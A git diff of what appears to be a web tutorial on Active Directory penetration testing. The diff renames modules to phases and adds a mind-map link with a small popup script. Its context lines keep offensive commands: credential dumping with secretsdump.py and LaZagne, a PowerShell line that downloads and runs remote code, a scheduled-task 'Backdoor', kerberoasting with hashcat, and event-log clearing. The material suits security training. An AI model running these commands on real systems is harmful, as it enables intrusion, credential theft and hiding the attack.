@@ -1,11 +1,11 @@
-# Active Directory Penetration Testing - Basics
+# Active Directory Penetration Testing - Basics to Advance
 
-> Ethical Hacking | Red Team | CTF | SOC Labs | Blue Team Awareness | Offensive Security
+> A comprehensive, step-by-step guide to Active Directory attacks—from beginner concepts to advanced exploitation—equipping you with practical skills, tools, and techniques essential for real-world penetration testing, red teaming, and security analysis.
 <div class="ad-module">
 
-## 🧭  Objectives
+## 🧭 Objectives
 
-This guide takes you through a full course on attacking Active Directory (AD) environments, suitable for red team operations, CTF competitions, and SOC training. You'll cover:
+You will Learn:
 
 - AD core concepts
 - Recon and enumeration
@@ -13,11 +13,12 @@ This guide takes you through a full course on attacking Active Directory (AD) en
 - Movement and escalation
 - Attacking Kerberos, trusts, and related systems
 - Post-exploitation, evasion, and cleanup
+- A Full Mind map of AD Hacking
 </div>
 
 <div class="ad-module">
 
-## 🧱 Module 1: Active Directory Basics
+## 🧱 Phase 1: Active Directory Basics
 
 **Definition:** Active Directory (AD) is Microsoft’s centralized domain management system that authenticates and authorizes users and computers.
 
@@ -38,7 +39,7 @@ This guide takes you through a full course on attacking Active Directory (AD) en
 
 <div class="ad-module">
 
-## 🛰️ Module 2: Reconnaissance Phase
+## 🛰️ Phase 2: Reconnaissance Phase
 
 **Goal:** Map the network and identify live hosts/services.
 
@@ -55,7 +56,7 @@ nbtscan 192.168.1.0/24
 
 <div class="ad-module">
 
-## 🔍 Module 3: Enumeration Phase
+## 🔍 Phase 3: Enumeration Phase
 
 **Goal:** Discover domain details—users, shares, GPOs, etc.
 
@@ -71,7 +72,7 @@ ldapsearch -x -H ldap://192.168.1.100 -b "dc=domain,dc=local"
 
 <div class="ad-module">
 
-## 🚪 Module 4: Initial Access
+## 🚪 Phase 4: Initial Access
 
 **Goal:** Obtain a foothold using weak auth or misconfig.
 
@@ -88,7 +89,7 @@ mitm6 -i eth0
 
 <div class="ad-module">
 
-## 🔐 Module 5: Credential Access
+## 🔐 Phase 5: Credential Access
 
 **Goal:** Extract passwords, hashes, and tickets.
 
@@ -104,7 +105,7 @@ secretsdump.py domain/user:pass@192.168.1.100
 
 <div class="ad-module">
 
-## 📡 Module 6: Lateral Movement
+## 📡 Phase 6: Lateral Movement
 
 **Goal:** Move to other systems after initial access.
 
@@ -120,7 +121,7 @@ psexec.py domain/user:pass@192.168.1.101
 
 <div class="ad-module">
 
-## 📈 Module 7: Privilege Escalation
+## 📈 Phase 7: Privilege Escalation
 
 **Goal:** Escalate local user to SYSTEM or Domain Admin.
 
@@ -136,7 +137,7 @@ powershell -ep bypass -Command "IEX (New-Object Net.WebClient).DownloadString('h
 
 <div class="ad-module">
 
-## 🧲 Module 8: Persistence Techniques
+## 🧲 Phase 8: Persistence Techniques
 
 **Goal:** Maintain long-term access.
 
@@ -151,7 +152,7 @@ schtasks /create /tn "Backdoor" /tr "cmd.exe /c whoami >> C:\backdoor.txt" /sc m
 
 <div class="ad-module">
 
-## 🎭 Module 9: Kerberos Attacks
+## 🎭 Phase 9: Kerberos Attacks
 
 **Goal:** Abuse ticketing mechanisms.
 
@@ -167,7 +168,7 @@ hashcat -m 13100 hashes.txt rockyou.txt --force
 
 <div class="ad-module">
 
-## 🏛️ Module 10: Domain Escalation
+## 🏛️ Phase 10: Domain Escalation
 
 **Goal:** Gain Domain Admin or take over trusts.
 
@@ -182,7 +183,7 @@ Invoke-AddComputer
 
 <div class="ad-module">
 
-## 🧾 Module 11: Post-Exploitation
+## 🧾 Phase 11: Post-Exploitation
 
 **Goal:** Data collection, pivoting, intel gathering.
 
@@ -196,7 +197,7 @@ LaZagne.exe browsers
 
 <div class="ad-module">
 
-## 🕵️ Module 12: Defense Evasion
+## 🕵️ Phase 12: Defense Evasion
 
 **Goal:** Avoid detection during attacks.
 
@@ -210,7 +211,7 @@ Clear-EventLog -LogName Security
 
 <div class="ad-module">
 
-## 🧹 Module 13: Cleanup
+## 🧹 Phase 13: Cleanup
 
 **Goal:** Remove traces post-assessment.
 
@@ -225,7 +226,7 @@ Clear-EventLog -LogName System
 
 <div class="ad-module">
 
-## 🖧 Module 14: Connected System Attacks
+## 🖧 Phase 14: Connected System Attacks
 
 **Exchange:**
 
@@ -251,6 +252,24 @@ Invoke-SelfSearch -Mailbox user@domain.local -SearchQuery 'password'
 | Responder | LLMNR spoof | 34bdf2dc |
 | PEASS-ng | Privesc check | a1074bbf |
 | PowerSploit | PowerShell recon/privesc | 473d90f6 |
+
+
+
+## 🧠 Advanced: Active Directory Mind Map
+
+<a href="/assets/img/pentest_ad_dark_2022_11.svg" target="_blank" onclick="window.open(this.href, '_blank'); return false;" style="display:inline-block;padding:10px 20px;font-size:1.1em;margin-bottom:15px;background:#2d7ff9;color:#fff;text-decoration:none;border:none;border-radius:5px;cursor:pointer;">Open Mind Map</a>
+<script type="text/javascript">
+  document.addEventListener('DOMContentLoaded', function() {
+    var links = document.querySelectorAll('a[href$="pentest_ad_dark_2022_11.svg"]');
+    links.forEach(function(link) {
+      link.addEventListener('click', function(e) {
+        e.preventDefault();
+        var win = window.open('', '_blank');
+        win.document.write('<html><head><title>Active Directory Mind Map</title></head><body style="margin:0;background:#222;display:flex;align-items:center;justify-content:center;height:100vh;"><img src="' + link.href + '" style="width:33vw;height:auto;max-width:none;box-shadow:0 2px 8px rgba(0,0,0,0.2);background:#fff;border-radius:8px;" /></body></html>');
+      });
+    });
+  });
+</script>
 
 ## ✅ You're Ready!
 
